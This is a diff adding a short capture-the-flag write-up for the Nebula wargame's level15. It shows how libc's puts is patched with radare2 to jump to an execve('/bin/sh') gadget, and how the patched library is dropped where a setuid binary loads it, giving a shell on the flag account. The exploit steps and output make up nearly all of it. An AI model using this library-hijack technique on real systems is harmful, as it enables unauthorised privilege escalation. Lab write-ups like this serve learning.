@@ -1,0 +1,20 @@
+copy out libc.so.6 from the system
+the binary calls puts "strace it!", patch puts to jump to the magic /bin/sh point in libc
+found /bin/sh point in ida at 0x000BA902, start of function is at 0x000BA8C0
+also make sure eax is cleared out, otherwise execve in /bin/sh is called with extra stuff that causes a crash
+
+$ r2 -w libc.so.6
+[0x00000000]> s sym.puts
+[0x000603b0]> "wa xor eax, eax;jmp 0x000BA8C0"
+[0x000603b0]> pd 10
+            ;-- _IO_puts:
+            ;-- puts:
+            0x000603b0      31c0           xor eax, eax
+        ,=< 0x000603b2      e909a50500     jmp 0xba8c0
+
+
+level15@nebula:~$ cp libc.so.6 /var/tmp/flag15/
+level15@nebula:~$ cd /home/flag15
+level15@nebula:/home/flag15$ ./flag15 
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
